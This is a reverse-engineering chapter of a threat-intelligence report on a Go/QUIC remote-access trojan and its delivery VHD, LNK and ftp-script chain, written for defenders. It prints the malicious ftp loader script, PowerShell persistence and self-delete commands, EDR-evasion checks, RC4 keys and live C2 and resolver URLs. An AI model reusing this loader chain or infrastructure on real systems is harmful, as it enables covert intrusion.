# 05 · Reverse engineering

[⬅ Attribution](04-attribution-assessment.md) · **Reverse engineering** · [Infrastructure ➡](06-infrastructure.md)

> **TLP:CLEAR** · as of **2026-10-15** · static analysis only — samples were read, never executed. Sandbox behaviour comes from public Triage and Joe Sandbox reports.
> Tools: Go build-info and pclntab parsing ([`tools/quicagent_triage.py`](../tools/quicagent_triage.py)), capstone disassembly, `dissect` (VHD / FAT), LnkParse3 and our own parsers ([`tools/`](../tools/)).

---

## Specimens

| Specimen | SHA-256 | Size | Go build ID | Seen | Tag |
|---|---|---|---|---|---|
| **December build** (memory image — see note) | `2655c0161601b009d2022e02e2c1860a884638c91159e9c9f99fc472445bfc63` | 7,413,764 | `EKPsuemjtp6WCai9nfVN/…` | Triage 2025-12-22 | **NOVEL** |
| **April build** HolidayNotice.pdf.exe | `c4b4647795567ab15528edd1ab1bf37fb50e21b442e59a653051061973e87c02` | 7,295,488 | `0gs8iM_yVWH97PiYyEgQ/…` | Triage 2026-04-15 | CORROBORATED |
| **June build** Windowsupdate.exe | `cd147efe37003399e174951927e5fe727a4481756b116f0204a14a64cc62b059` | 7,046,656 | `VQ20YVf_9K_8cgCF_NX7/…` | Seqrite (June) | CORROBORATED |
| **August respin** 146846541.exe | `c15aead19e0d6e8ed51de79a858d7ef6b5ede226c7db79e7008a23b3445c164d` | 7,046,656 | same as June | Triage 2026-08-14 | **NOVEL** |
| **Deleted `header.doc`** (Recycle Bin) | `b1fd6a1cfa78429b3bf5adf64f69d35998f54577df486b2a1acdf854d11a12a6` | 652,141 | `_sw2KbxsCYNkMfIn2x3Q/…` | inside the VHD only | **NOVEL** |
| ACMECS_Pillar_1.vhd | `0803521a7e9081f46f8f9f61d72371ecc1f49657f10202fffa9a33f581d8bb39` | 14,716,928 | — | Seqrite (July) | CORROBORATED |
| ACMECS_Pillar_1.pdf.lnk | `836fa2c799b0b7c2ab683055d880674a2cfe95dc6e47b0650f9f8e0dcb43f858` | 1,911 | — | inside the VHD | **NOVEL** |

Full build IDs, SHA-1 and MD5: [`iocs/file-hashes.csv`](../iocs/file-hashes.csv) and [`iocs/iocs.csv`](../iocs/iocs.csv).

> **The December specimen is a memory image, not the file the operator shipped** (NOVEL). Every section's raw pointer equals its virtual address and its raw size equals its virtual size (`.text` 3,346,982 B — not `FileAlignment`-aligned); the file ends at the `.symtab` address + 4; `ImageBase` is `0x920000` (Go's default, as in April and the deleted `header.doc`, is `0x400000`), and thousands of `.data` pointers are already relocated to that base while `.bss` is untouched. Someone dumped it **after Windows loaded it and before its code ran**, then it reached Triage through a bulk feed (`2025-12-22_ef50056b…`). So: its SHA-256 / MD5 / size describe the **dump** — a copy on a victim's disk will hash differently. Hunt it by behaviour and YARA (the strings and code are unchanged), not by hash. Its "file offsets" below are virtual addresses (RVAs).

---

## 1 · The delivery container

| Field | Value | How |
|---|---|---|
| Format | Dynamic VHD (footer cookie `conectix`, disk type 3), virtual size 13,631,488 B | VHD footer |
| Created | **2026-01-13 06:13:38 UTC**, creator application `win `, host OS `Wi2k` (Windows' built-in VHD support) | VHD footer |
| Volume | FAT, label `NO NAME`, volume ID `1CC59A84`; first FAT stamps 2026-01-12 **22:13:45 local** → the creating clock was **UTC−8** | dissect.fat |
| Mounted as | `E:` on the operator machine (Recycle Bin paths `E:\_\…`) | `$I` records |
| Contents | `ACMECS_Pillar_1.pdf.lnk` · `_\ACMECS_Pillar_1.pdf` · `_\_\j\_\_\_\_\_\_` (script) · `…\_rels\header.doc` · `…\_rels\body.doc` · `System Volume Information` · `$RECYCLE.BIN` (8 `$I`/`$R` pairs) | [`vhd_recycle_timeline.py`](../tools/vhd_recycle_timeline.py) |

`header.doc` (3,523,328 B, begins `MZ`) + `body.doc` (3,523,328 B) concatenated = **`cd147efe…` byte for byte** (CORROBORATED). Both halves carry FAT mtime **2026-06-25 04:27:42 local** — the writing machine's clock, which we cannot pin (on the UTC−3 decoy clock that is ~8 min after `TrainingAnnouncement.pdf` went in; on the UTC−8/−7 payload clock, ~4 h). Windows `copy` keeps the source's mtime, so the halves were **placed on or after** that time. `HEADER.DOC` carries the exact creation time of the file deleted on 14 May (2026-01-12 22:15:00.73) — consistent with **file-system tunnelling**, which hands the old creation time to a same-name file created within ~15 s of the deletion. So a replacement `header.doc` was **likely** written right after the 14 May deletion, and its content was last replaced on or after 25 Jun; `BODY.DOC` keeps its January creation time and was overwritten in place (NOVEL). The Recycle Bin timeline is in [06](06-infrastructure.md#the-lure-factory--one-container-eight-decoy-slots).

---

## 2 · The LNK and the ftp script

```text
Target      %SystemRoot%\System32\ftp.exe                (EnvironmentVariableDataBlock)
Arguments   -s"":_/_/j/_/_/_/_/_/_
Icon        .\1.pdf
Window      SW_SHOWMINNOACTIVE   Console font: Consolas, buffer 120x9001
Target times (ftp.exe)  created/modified 2018-09-15 07:29:23 UTC, accessed 2022-08-28 03:40:56 UTC, 58,880 B
```

`ftp.exe -s:<file>` reads FTP commands from a file; a line starting with `!` is passed to the shell. The empty `""` before the colon is a parser trick: Windows' command-line parsing still yields `-s:…`, while naïve string matching on `-s:` misses it. The script (`_`, 209 bytes, CRLF):

```text
!start /max _\ACMECS_Pillar_1.pdf
!call copy /Y /b _\_\j\_\_\_\_\_\_rels\header.doc+_\_\j\_\_\_\_\_\_rels\body.doc "%LOCALAPPDATA%\Windowsupdate.exe" >nul
!start "%LOCALAPPDATA%\Windowsupdate.exe" >nul
quit
```

`ftp.exe` hands each `!` line to `cmd.exe /C` **with the double quotes removed**, so the `start` line does not open an empty titled window — it starts the payload. Triage 260818-sw2wjadk7v (behavioral31, 2026-08-18) shows the whole chain (CORROBORATED):

```text
ACMECS_Pillar_1.pdf.lnk  (opened by the sandbox from %TEMP%)
ftp.exe -s"":_/_/j/_/_/_/_/_/_
├─ cmd.exe /C start /max _\ACMECS_Pillar_1.pdf                  -> decoy opens in the PDF handler
├─ cmd.exe /C call copy /Y /b _\_\j\…\header.doc+_\_\j\…\body.doc %LOCALAPPDATA%\Windowsupdate.exe >nul
└─ cmd.exe /C start %LOCALAPPDATA%\Windowsupdate.exe >nul
   └─ C:\Users\Admin\AppData\Local\Windowsupdate.exe            -> HTTPS to both Workers
      └─ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Admin\AppData\Local\Temp\create_lnk_4258168477.ps1
```

---

## 3 · The two lineages

Both lineages are **Go 1.20, quic-go v0.40.1**, each written in one `main.go` and built by the Windows user **`qwe`**. They are two different programs with an **overlapping** server API — not the same one.

| | `agent` lineage — **Dec 2025 → Jun/Aug 2026** | `rat/agent` lineage — **Apr 2026** |
|---|---|---|
| Source | `C:/go agent 2/agent/main.go` (Dec) · `-trimpath` (Jun) | `C:/go agent/agent/main.go` |
| Module cache | `C:/Users/qwe/go/pkg/mod/` (Dec) | `C:/Users/qwe/go/pkg/mod/` |
| Build | Dec: `CGO_ENABLED=0`, `-ldflags="-s -H windowsgui"` · Jun: `CGO_ENABLED=1` (MinGW), `-trimpath` | `CGO_ENABLED=0`, `-ldflags="-s -H windowsgui"` |
| Dependencies | `x/crypto v0.4.0`, `x/net v0.10.0`, `x/sys v0.8.0`, `x/exp 2022-12-05`, `x/text v0.14.0` — **identical in Dec and Jun** | `x/crypto v0.17.0`, `x/net v0.19.0`, `x/sys v0.15.0`, `x/exp 2023-03-15`, plus **`go-ole` v1.3.0, `google/uuid` v1.5.0, `mitchellh/go-ps` v1.0.0** |
| Pinned certificate | **RAT CA** (EC P-384, same PEM in Dec and Jun) | **RAT-TeamServer** (RSA-2048, self-signed) |
| C2 lookup | Dec: hard-coded · Jun: Workers | hard-coded |
| C2 paths | `/heartbeat` · `/result` · `%s/upload?%s` · `%s/upload/next?%s` · `%s/download?task_id=%s&file_name=…` | `/heartbeat` · `/result` · **`/register`** · **`/upload/chunk/pull`** |
| Headers | `X-Agent-Hostname` `-OS` `-Arch` `-User` `-ID` · `X-Idempotency-Key` | `X-Idempotency-Key` only — no `X-Agent-*` |
| Results | generic `/result` body | typed: `shell_result`, `file_list_result`, `file_upload_start`, `file_upload_result`, `file_download_result` |
| RC4 key | `MySecretEncryptionKey2025!@#$%` (30 B) | **`2024axcegbaxcegb`** (16 B) |
| EDR names | `bdagent.exe`, `sentinelagent.exe` (`tasklist`, Dec only) | `SentinelAgent.exe`, `ptsessionagent.exe`, `bdagent.exe` (`go-ps`) — **2 of 3 overlap** |
| `main` functions (top-level) | Dec 42 · Jun 40 — **29 shared** | 25 — **4 shared** with Dec (`main`, `NewAgent`, `rc4Encrypt`, `sendResult`) |

**Proof that June descends from December** (NOVEL): all 29 shared functions appear in `main.go` **in the same order**, with line offsets that step only where code was inserted (+47 before `NewAgent`, +90 around the heartbeat, +120–129 around uploads):

| Function | Dec line | Jun line | Shift |
|---|---|---|---|
| `rc4Encrypt` | 106 | 153 | +47 |
| `NewAgent` | 141 | 188 | +47 |
| `(*Agent).sendHeartbeatWithRetry` | 313 | 403 | +90 |
| `(*Agent).uploadFile` | 525 | 654 | +129 |
| `(*Agent).handleTask` | 995 | 1115 | +120 |
| `(*Agent).run` | 1020 | 1140 | +120 |
| `main` | 1363 | 1725 | +362 |

Holding: the June build is **almost certainly** an edit of the December source; the April build is **very likely** a **separate rewrite** by the same developer — same user name and module cache, an overlapping API and EDR list, and certificates minted the same morning.

> **`/poll` is not an endpoint.** An earlier draft listed it. Every `/poll` hit in every build sits inside Go's own `internal/poll` package path, which is in all Go binaries (corrected before release, [09 C15](09-methodology-and-corrections.md#corrections-log)).

---

## 4 · June build — `Windowsupdate.exe` (`agent`, cgo)

### 4.1 Start-up sequence

```text
main.main (0x140334b00)
├─ main.antiDebugObfuscation   (0x140333860) sleep Intn(500)+100 ms, 1,000 x sha256.Sum256,
│                              then one syscall.(*LazyProc).Call                             (CORROBORATED)
├─ main.setupVEHStartup        (0x140334420) cgo register_veh -> AddVectoredExceptionHandler
│                              if it returned non-zero: cgo trigger_veh -> RaiseException
│                              then a DIRECT call to main.addToStartupFolder (both branches) (NOVEL)
├─ main.resolveServerURLs      GET both Workers, 10 s client timeout, parse, retry          (NOVEL detail)
├─ main.NewAgent               x509.CertPool.AppendCertsFromPEM(RAT CA) - os.Exit on failure
└─ main.(*Agent).run           loop: getHeartbeatInterval -> Sleep -> sendHeartbeatWithRetry -> handleTask
```

The build **registers a vectored exception handler and raises an exception**, then calls `addToStartupFolder` **directly** (0x140334469 / 0x140334478) — persistence is **not** dispatched by the handler. The register-and-raise step is likely anti-debug or anti-emulation: a debugger sees a first-chance exception, a weak emulator may stop. The handler body was not decompiled (§12). An earlier draft said persistence ran through the handler; that was wrong ([09 C16](09-methodology-and-corrections.md#corrections-log)).

### 4.2 Dead-drop resolver and the `all:` parser

`resolveServerURLs` (0x1403344a0) requests, in this order, `https://regupdate.eamakfu49dc28wa.workers.dev/vere0zme82cad` and `https://appupdate.0cmds20cj2cdf8.workers.dev/A3cmf0q9ASCion` (both literals are **59 bytes**, passed with `mov ecx, 0x3b`). Each body is trimmed; reply lines marked `all:` carry the C2 host list. The result is wrapped as `"https://" + host + ":443"` (`runtime.concatstring3`), and the function sleeps and retries until it gets one.

The parser does not reject non-`all:` bodies. When both Workers started returning Cloudflare's `error code: 1042` page, the implant built this "C2" — recovered from Joe Sandbox memory on 2026-10-15 (NOVEL):

```text
https://error code: 1042error code: 1042:443/heartbeat
```

Every implant still running is therefore **orphaned** until the operator repairs a Worker. A repaired Worker would bring them all back at once — keep the resolver hosts blocked.

### 4.3 Why Seqrite's path ends in `re`

Go stores string literals back to back with no terminator. Reading the regupdate URL "until the next non-URL byte" runs into the next literal:

```text
...workers.dev/vere0zme82cad|reflect: reflect.Value.Elem on ...
                            ^ the 59-byte literal ends here
```

Seqrite published `/vere0zme82cadre`; SOCRadar, HivePro and cybersecuritynews copied it. The implant requests **`/vere0zme82cad`** (NOVEL correction). [`quicagent_triage.py`](../tools/quicagent_triage.py) prints `…/vere0zme82cadreflect` for the same reason.

### 4.4 Persistence and launch

| Function | Behaviour | Tag |
|---|---|---|
| `addToStartupFolder` (0x140333b40) | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemIn.lnk` (12-byte name literal) via a temp `create_lnk_*.ps1`: `$WshShell = New-Object -ComObject WScript.Shell` / `CreateShortcut('%s')` / `TargetPath = '%s'` / `Save()`, run as `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %TEMP%\create_lnk_<digits>.ps1` (Triage: `create_lnk_4258168477.ps1`) | CORROBORATED |
| `launchViaCOM` (0x1403336e0) | `powershell.exe` with `$shell = New-Object -ComObject Shell.Application; $shell.ShellExecute('%s')` — the started process is parented by `explorer.exe`, not by the implant | **NOVEL** |

### 4.5 C2 protocol

| Element | Value | Tag |
|---|---|---|
| Transport | HTTP/3 over QUIC, `quic-go v0.40.1`, `qtls-go1-20 v0.4.1`, `qpack v0.4.0` | CORROBORATED |
| Trust | `VerifyPeerCertificate` against a pool holding **only** RAT CA | PUBLISHED · CORROBORATED |
| C2 paths | `/heartbeat`, `/result`, `%s/upload?%s`, `%s/upload/next?%s`, `%s/download?task_id=%s&file_name=…` | NOVEL |
| Headers | `X-Agent-Hostname`, `X-Agent-OS`, `X-Agent-Arch`, `X-Agent-User` (`attachSystemHeaders`), `X-Agent-ID`, `X-Idempotency-Key` | NOVEL (X-Agent-ID PUBLISHED) |
| Tasks | `shell`, `upload`, `download`, `list_dir`, `set_heartbeat` — compared as 64-bit integer constants; `Unknown task type` otherwise | PUBLISHED · CORROBORATED |
| Beacon | default 5 s (PUBLISHED); `set_heartbeat` accepts **1–3,600 s** (`Interval must be between 1 and 3600 seconds`) | NOVEL (range) |
| Failover | `currentServerURL` / `rotateServerURL` / `doRequestWithFailover` | NOVEL |
| Uploads | chunked: `requestNextUploadChunk`, `postUploadChunk`, `cancelRemoteUpload`, `isTransferTimeoutErr` | NOVEL |
| Encryption | RC4 on JSON bodies (`rc4Encrypt` / `rc4Decrypt`). The key **`MySecretEncryptionKey2025!@#$%`** (30 B) is built on the stack by four `movabs` stores to `[rsp+0x3a/0x42/0x48/0x50]`, length `0x1e` — the `movabs` instructions start at Dec RVA `0x327e8d` / `0x327fcd` (the specimen is a memory image, so file offset = RVA) and June file offsets `0x328e6d` / `0x328fad`. It is never a single string, which is why a plain-text search misses it | CORROBORATED (key) · NOVEL (stack build; [YARA](../detections/yara/quicsilver.yar) `RC4_Key_Builder`) |

---

## 5 · December build — `2655c016` (`agent`, no cgo)

The same client as June minus the resolver, failover and VEH code, plus an **installer** that June dropped. Hard-coded base URL `https://www.maui-cocktailbar.com:443` with `/heartbeat` and `/result` literals; pins RAT CA; the same stack-built RC4 key.

```text
main.main (0xc51fa0)
├─ main.cleanupOriginalFromArgs     if argv[1] is the old path: delete it (deleteOriginalExecutable)
├─ main.ensurePersistenceLocation   (0xc51b80)
│   ├─ main.monitoringProcessDetected (0xc51b20)
│   │     processExists("bdagent.exe")       -> tasklist /FO CSV /NH   (Bitdefender)
│   │     processExists("sentinelagent.exe") -> tasklist /FO CSV /NH   (SentinelOne)
│   │   └─ either found: jne 0xc51dab  -> skip the copy / hide / relaunch block
│   ├─ os.Executable, pathsEqual(C:\Users\Public\Downloads\SystemPublicCache\<name>)
│   ├─ main.copyExecutable
│   ├─ main.setHiddenSystemAttributes   attrib +h +s
│   └─ main.relaunchFrom                start the copy with the original path as argv[1]
├─ main.hideExecutable                  attrib +h
├─ main.NewAgent                        AppendCertsFromPEM(RAT CA)
└─ main.(*Agent).run
main.scheduleSelfDelete: cmd.exe /c ping 127.0.0.1 -n 3 >nul & del /f /q "%s"
```

All of the above is **NOVEL**. The specimen is a memory image ([note](#specimens)) — Windows still runs it. The Triage runs (Win10 and Win11) match the code exactly: two `tasklist` calls per process, `attrib +h +s`, a relaunch from `SystemPublicCache`, `attrib +h`, and deletion of the original.

Disassembly of the EDR check (`main.ensurePersistenceLocation`):

```text
0xc51ba6  call main.monitoringProcessDetected
0xc51bab  test al, al
0xc51bad  jne  0xc51dab          ; Bitdefender or SentinelOne running -> no install step
```

---

## 6 · April build — HolidayNotice.pdf.exe (`rat/agent`)

```text
main.main (0x72d860)
├─ (copy only) started from C:\Users\Public: sleep 1 s, then os.Remove the original EXE
│              and C:\Users\Public\original_path.txt                     (0x72da6e-0x72da92)
├─ main.NewAgent                       AppendCertsFromPEM(RAT-TeamServer)
├─ main.isProcessRunning("SentinelAgent.exe")    go-ps   (SentinelOne)
├─ main.isProcessRunning("ptsessionagent.exe")   go-ps   (Trend Micro "Platinum" session agent)
├─ main.isProcessRunning("bdagent.exe")          go-ps   (Bitdefender) - result kept for later (0x72dbc4)
├─ SentinelOne or Trend Micro found:
│     extractAndOpenPDF -> setFileSystemHidden(own EXE, +H +S, in place) (0x72dbf9)
│     -> register + heartbeat from where it was launched   (NO install, no copy)
└─ otherwise:
      extractAndOpenPDF
      main.saveOriginalPath            C:\Users\Public\original_path.txt - written by the ORIGINAL (0x72dc32)
      copy to C:\Users\Public\<name>.exe  (not hidden)
      Bitdefender seen? (0x72de57)     yes: start the copy with cmd /c  ·  no: main.runViaCom (WScript.Shell.Run)
      os.Exit(0) (0x72df47)            - the copy carries on below
main.(*Agent).extractAndOpenPDF
      embed.FS "sample.pdf" -> filepath.Dir(os.Executable()) \ <name without .exe>.pdf -> cmd /c <pdf>
      glob %USERPROFILE%\Downloads\*.hta -> os.Remove each match            (0x72d2de-0x72d426)
main.(*Agent).register                 /register with hostname, username (%USERNAME%), os, arch
main.(*Agent).heartbeatLoop            /heartbeat {interval, type, data, agent_id}
```

**Bitdefender does not stop the April install** — it only changes how the copy is launched. **SentinelOne or Trend Micro does stop it**: the implant hides its own file (+H +S) and runs in place. On a normal install `original_path.txt` and the original EXE are deleted about a second after the copy starts — expect them only in **file-create telemetry**, not on disk.

| Detail | Value | Tag |
|---|---|---|
| Results | typed: `shell_result`, `file_list_result`, `file_upload_start`, `file_upload_result`, `file_download_result` (no generic `/result` body) | NOVEL |
| Uploads | pulled in chunks from `/upload/chunk/pull` (`pullNextUploadChunk`, `applyUploadChunk`) | NOVEL |
| RC4 key | **`2024axcegbaxcegb`** (16 B), built on the stack in `rc4Encrypt` (0x725dc0) | NOVEL |
| Decoy | `7b95b217…` (287,438 B, a Belgian–Myanmar holiday calendar), stored as `sample.pdf` in `embed.FS`. Triage ran the sample from `%TEMP%` as `<sha256>.exe`, so it opened `cmd /c %TEMP%\<sha256>.pdf` → Acrobat | hash PUBLISHED · rest NOVEL |
| HTA cleanup | deletes every `*.hta` in the user's `Downloads` — **likely** removing the delivery file, which suggests an HTA stage before this EXE (inference) | NOVEL |

---

## 7 · The August respin

`c15aead1` and `cd147efe` differ in **one byte**:

```text
offset 0x6B8578 (.reloc section slack, inside the body.doc half):  00 -> 90
```

Same Go build ID, same code, new hash — **likely** a deliberate respin to break hash blocklists; the patch is proven, the intent is not (NOVEL). It resolved `register.mediumser.com` → **130.94.100.181** on 2026-08-14.

---

## 8 · Certificates

| | RAT CA | C2 leaf | RAT-TeamServer |
|---|---|---|---|
| Subject | `C=US, O=RAT System, CN=RAT CA` | `C=US, O=RAT System, CN=localhost` | `CN=RAT-TeamServer` |
| Issuer | self | RAT CA | self |
| Key | EC P-384 | EC P-384 | RSA-2048 |
| Serial | 1 | **2** | `3D141BFB016BF3AF419D4127E1C6B2E6` |
| Validity | 2025-12-05 08:17:02 → 2035-12-03 08:17:02 | **identical to the second** | 2025-12-05 05:57:54 → 2026-12-05 06:07:55 |
| SKI / AKI | SKI `f2f17b88d28bb8eb18147dd5d39eff47fcdc49f6` | AKI = CA SKI · no SKI (Go behaviour) | SKI `982a35f8318fbb88b2f809b4eaad748f1eff43ab` |
| Extensions | BC critical CA:TRUE · KU critical digitalSignature + keyEncipherment + **keyCertSign** · EKU serverAuth | KU critical digitalSignature + keyEncipherment · EKU serverAuth · SAN `localhost`, `127.0.0.1` | KU critical digitalSignature + keyEncipherment · EKU **clientAuth + serverAuth** · SAN **`DNS:RAT-TeamServer`** (a hunting pivot) |
| SHA-256 | `dad3fa94…` | `6b348f7a…` | `2290c2a6…` |
| Where | Dec, Jun, Aug builds | **Censys, 2026-07-15 09:16 UTC** | Apr build |
| Tag | CORROBORATED | **NOVEL** | **NOVEL** |

**Leaf reconstruction** (NOVEL): Censys published parsed fields, not the DER. [`tools/rat_leaf_verify.py`](../tools/rat_leaf_verify.py) rebuilds the TBSCertificate the way Go's `crypto/x509` encodes it (issuer = the CA's raw subject, PrintableString names, the AKI copied from the CA's SKI), matches Censys' `tbs_fingerprint` `f417bd30…`, and verifies the ECDSA-SHA384 signature with the CA key from the implant:

```text
TBS match          : True
Signature by embedded RAT CA: VALID
Rebuilt cert sha256: 6b348f7ad068f0324fcf0fff6e91437adb5edd8d2301e44cc0888ef2a8fd43ca
```

Both certificate sets were made on the morning of **5 Dec 2025**, about two hours apart — the developer's setup day for both lineages.

---

## 9 · The deleted `header.doc` — an earlier payload

| Fact | Value |
|---|---|
| Record | `$ISZLWN9.DOC` → `E:\_\_\j\_\_\_\_\_\_rels\header.doc`, **652,141 B**, deleted **2026-05-14 01:37:35 UTC** (UTC−7 clock) |
| File stamps | written into the container 2026-01-12 22:15 *local* (= container build day); last modified 2026-01-12 01:20:34 *local* |
| Content | PE32+ GUI, Go build ID `_sw2KbxsCYNkMfIn2x3Q/VMa2o1UjpkJjOqzDOuYO/JhWDeww6ni9Yd_johvsn/3TIOKadskgiwtphWSCm3`. The section table implies a **7,007,744-byte file** (`.text` 3,347,968 · `.rdata` 3,228,160 · `.data` 364,544 raw · `.idata` 1,536 · `.reloc` 63,488 · `.symtab` 512); `SizeOfImage` 7,405,568 |
| Section sizes (VirtualSize, vs December / vs April) | `.data` 743,568: **0** / −6,528 · `.rdata` 3,227,864: **−15,344** / −296,048 · `.text` 3,347,465: **+483** / +15,491 |
| Entry point | **`0x675E0`**, identical to December (April `0x67760`). It lies ~419 KB into `.text`, inside the compared region, so it is **not independent** of the byte test: April's `0x180` shift and its 400 KB collapse are the same event |
| Byte identity | Compared **from each file's `.text` start** (the December specimen is a memory image, so its `.text` sits at `0x1000`; the others at `0x600`/`0x400`): first 390,000 B match **December 98.0 %**, April 95.1 %, June 4.5 %. In 50 KB windows December stays ≥ 95.6 % to 500 KB, then also falls (24.8 %, then ~5 %); April falls to 10.1 % at 400 KB |
| Caveat | The first ~400 KB is mostly Go runtime, which only shows the toolchain. The strongest signal is whole-binary: section sizes within 15 KB of December, ~300 KB away from April |
| Holding | **Likely an `agent`-lineage build close to December** (low confidence). Its `body.doc` half is gone; the full file has not surfaced publicly (dated null 2026-10-15) |

> **Retraction.** An earlier draft put this payload in the **`rat/agent`** lineage and dated that lineage to January 2026. That came from comparing the files at raw offsets without aligning `.text` — an alignment artefact. The claim is withdrawn ([09 C14](09-methodology-and-corrections.md#corrections-log)).

So the container probably carried an **`agent`-lineage payload from 13 Jan to 14 May 2026** — consistent with the December build being in use when the container was made (NOVEL). Only a 652 KB fragment survives, so whether that payload worked is unknown.

---

## 10 · Network behaviour in sandboxes

| Run | Build | C2 | Client packets | Server packets |
|---|---|---|---|---|
| Triage 251222-kah8asynej (2025-12-26, 150 s) | Dec | 38.60.244.92:443 | 135 × 1,280 B (172.8 kB) | **0** |
| Triage 260415-d3xg3ad14q (2026-04-15, 150 s) | Apr | 38.60.244.141:443 | 135 × 1,280 B (172.8 kB) | **0** |
| Triage 260814-zaebnshl2y (2026-08-14, 300 s) | Aug | 130.94.100.181:443 | 270 × 1,280 B (345.6 kB) | **0** |
| Triage 260815-yx3r4stvdy (2026-08-15 20:10, 900 s) | Aug | Workers → `register.mediumser.com` → 130.94.100.181:443 | 801 (1.0 MB ≈ 801 × 1,280 B) | none listed |
| Triage 260818-sw2wjadk7v (submitted 2026-08-18 15:29, ~300 s, via the ACMECS LNK) | Jun | — (both Workers over TCP/443; **no C2 lookup**) | — | — |
| Triage 260918-gy8w3sbl7v (2026-09-18) | Jun | — (Workers only, TCP/443) | — | — |
| Joe 1987362 (2026-10-15) | Jun | Workers → `error code: 1042` | — | — |

quic-go pads the client Initial to a **1,252-byte UDP payload** (1,280-byte IPv4 packet). A steady train of 1,280-byte UDP/443 packets with no replies is what a QUICAgent host with a dead or filtering C2 looks like on the wire (NOVEL).

---

## 11 · The LNK — builder artefacts

```text
machine             desktop-stv6gg                                  (CORROBORATED - published by Seqrite)
droid_file          9534FAD6-1675-11EF-8391-8045DDE5916E  (UUIDv1)
  -> time           2024-05-20 06:52:54 UTC
  -> MAC            80:45:dd:e5:91:6e  (globally administered; Intel OUI)
droid_volume        A634437A-91AC-4BBE-8D1E-E389C95D025E
volume serial       C205DAF6
volume label        CE D2 B5 C4 B4 C5 C5 CC  -> GBK "我的磁盘"  ("My disk")
```

All but the machine name are NOVEL. The MAC is a real (not random) node, so a second LNK from the same builder will carry the same value — the test for the 18 Aug GriefLure-template sample ([08](08-threat-hunting-playbook.md#-open-leads)). Reproduce with [`tools/lnk_tracker.py`](../tools/lnk_tracker.py).

---

## 12 · What we could not verify

| Item | Status |
|---|---|
| A live C2 exchange | Both RC4 keys are recovered statically (4.5, §6); no session was ever captured to confirm them on the wire |
| The C helper bodies of `register_veh` / `trigger_veh` | Call graph and imports (`AddVectoredExceptionHandler`, `RaiseException`) confirmed; handler internals not decompiled — what it does on the exception is unknown |
| Which files `*.hta` cleanup targets in the wild | Code only; no HTA from this operator is public |
| What the operator's server answers | No sandbox run ever got a server packet |
